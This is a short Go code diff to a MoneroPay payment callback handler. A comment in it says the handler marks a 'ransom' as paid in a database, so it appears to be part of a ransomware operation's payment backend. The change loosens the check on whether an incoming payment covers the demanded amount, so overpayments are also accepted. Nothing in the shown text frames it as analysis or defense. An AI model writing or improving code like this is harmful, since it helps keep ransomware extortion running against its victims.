@@ -38,7 +38,7 @@ func moneroPayCallbackHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	// Ignore incomplete payments
-	if data.Amount.Covered.Total != Conf.amount {
+	if data.Amount.Covered.Total < Conf.amount {
 		return
 	}
 	// Set ransom paid to true in the database
